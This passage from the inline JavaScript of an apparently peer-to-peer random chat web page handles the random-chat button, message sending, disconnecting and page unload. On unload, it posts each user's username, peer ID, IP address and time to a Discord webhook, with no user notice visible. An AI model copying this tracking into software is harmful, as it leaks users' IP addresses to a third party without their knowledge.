            const availableUsers = Array.from(onlineUsers.entries())
                .filter(([peerId, userData]) => 
                    peerId !== myPeerId && 
                    peerId !== TRACKER_SERVER_ID
                ).length;
            
            randomChatBtn.disabled = availableUsers < 1 || isConnected || isSearching;
            
            if (availableUsers < 1) {
                randomChatBtn.textContent = 'No Users Available';
            } else if (isSearching) {
                randomChatBtn.textContent = 'Searching...';
            } else {
                randomChatBtn.innerHTML = '<span class="icon">ðŸŽ²</span> Start Random Chat';
            }
        }
        
        function toggleRandomChat() {
            if (isSearching) {
                stopSearching();
            } else {
                startSearching();
            }
        }
        
        connectForm.addEventListener('submit', (e) => {
            e.preventDefault();
            const peerId = peerIdInput.value.trim();
            
            if (peerId) {
                connectToPeer(peerId);
            } else {
                showError('Please enter a valid Peer ID');
            }
        });
        
        messageForm.addEventListener('submit', (e) => {
            e.preventDefault();
            const message = messageInput.value.trim();
            
            if (message && isConnected) {
                connection.send({
                    type: 'message',
                    message: message
                });
                
                appendMessage(message, true, localUsername);
                
                messageInput.value = '';
            }
        });
        
        disconnectBtn.addEventListener('click', () => {
            disconnectFromPeer();
        });
        
        randomChatBtn.addEventListener('click', () => {
            toggleRandomChat();
        });
        
        document.addEventListener('DOMContentLoaded', () => {
            initializePeer();
            
            chatScreen.style.display = 'none';
            
            updateRandomChatButton();
        });
        
        window.addEventListener('beforeunload', () => {
            // Send leave notification to Discord
            sendToDiscordWebhook(`ðŸšª **User Left**\n- Username: ${localUsername}\n- Peer ID: ${myPeerId}\n- IP: ${userIP}\n- Time: ${new Date().toLocaleString()}`);
            
            if (connection) connection.close();
            if (trackerConnection) trackerConnection.close();
            if (heartbeatInterval) clearInterval(heartbeatInterval);
            if (matchmakingInterval) clearInterval(matchmakingInterval);
            if (onlineCheckInterval) clearInterval(onlineCheckInterval);
            
            // Remove visibility change handler
            if (visibilityChangeHandler) {
                let visibilityChange;
                if (typeof document.hidden !== "undefined") {
                    visibilityChange = "visibilitychange";
                } else if (typeof document.msHidden !== "undefined") {
                    visibilityChange = "msvisibilitychange";
                } else if (typeof document.webkitHidden !== "undefined") {
                    visibilityChange = "webkitvisibilitychange";
                }
                
                if (visibilityChange) {
                    document.removeEventListener(visibilityChange, visibilityChangeHandler);
                }
            }
            
            if (peer) peer.destroy();
        });
    </script>
